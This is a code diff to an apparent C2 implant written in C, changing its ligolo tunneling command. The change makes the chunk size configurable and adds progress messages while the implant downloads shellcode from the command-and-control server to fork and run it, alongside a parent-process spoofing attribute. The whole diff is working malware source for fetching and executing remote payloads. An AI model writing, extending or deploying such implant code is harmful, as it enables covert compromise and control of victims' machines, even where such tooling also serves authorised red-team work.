@@ -18,7 +18,7 @@
 #define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS    0x00020000
 #endif
 
-#define LIGOLO_CHUNK_SIZE (512 * 1024)
+#define LIGOLO_CHUNK_SIZE (4 * 1024 * 1024)
 
 #if defined(INCLUDE_CMD_LIGOLO_START) || defined(INCLUDE_CMD_LIGOLO_STOP) || defined(INCLUDE_CMD_LIGOLO_STATUS)
 
@@ -182,6 +182,7 @@ static void ligolo_impl(char *task_id, char *params, const char *action) {
     char user_agent[512]         = {0};
     char shellcode_file_id[128]  = {0};
     char ligolo_args[1024]       = {0};
+    int  sc_chunk_size           = LIGOLO_CHUNK_SIZE;
     int  ignore_cert             = 1;
     int  retry                   = 1;
     int  verbose                 = 0;
@@ -194,6 +195,10 @@ static void ligolo_impl(char *task_id, char *params, const char *action) {
     extract_json_string(params, "user_agent",         user_agent,         sizeof(user_agent));
     extract_json_string(params, "shellcode_file_id",  shellcode_file_id,  sizeof(shellcode_file_id));
     extract_json_string(params, "ligolo_args",        ligolo_args,        sizeof(ligolo_args));
+    {
+        int v = ligolo_extract_int(params, "sc_chunk_size", 0);
+        if (v > 0) sc_chunk_size = v;
+    }
     ignore_cert = ligolo_json_bool(params, "ignore_cert", 1);
     retry       = ligolo_json_bool(params, "retry",       1);
     verbose     = ligolo_json_bool(params, "verbose",     0);
@@ -212,12 +217,22 @@ static void ligolo_impl(char *task_id, char *params, const char *action) {
         int            chunk_num     = 1;
 
         while (1) {
-            char json_msg[1024];
-            snprintf(json_msg, sizeof(json_msg),
-                "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
-                "\"upload\":{\"chunk_size\":%d,\"file_id\":\"%s\","
-                "\"chunk_num\":%d,\"full_path\":\"<ligolo_fork_run>\"}}]}",
-                task_id, LIGOLO_CHUNK_SIZE, shellcode_file_id, chunk_num);
+            char json_msg[2048];
+            if (chunk_num == 1 || total_chunks <= 0) {
+                snprintf(json_msg, sizeof(json_msg),
+                    "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
+                    "\"upload\":{\"chunk_size\":%d,\"file_id\":\"%s\","
+                    "\"chunk_num\":%d,\"full_path\":\"<ligolo_fork_run>\"}}]}",
+                    task_id, sc_chunk_size, shellcode_file_id, chunk_num);
+            } else {
+                snprintf(json_msg, sizeof(json_msg),
+                    "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
+                    "\"status\":\"Downloading shellcode: chunk %d / %d\","
+                    "\"upload\":{\"chunk_size\":%d,\"file_id\":\"%s\","
+                    "\"chunk_num\":%d,\"full_path\":\"<ligolo_fork_run>\"}}]}",
+                    task_id, chunk_num, total_chunks,
+                    sc_chunk_size, shellcode_file_id, chunk_num);
+            }
 
             char *b64_resp = send_c2_message(json_msg);
             if (!b64_resp) { free(shellcode); send_task_response(task_id, "Error: C2 unreachable"); return; }
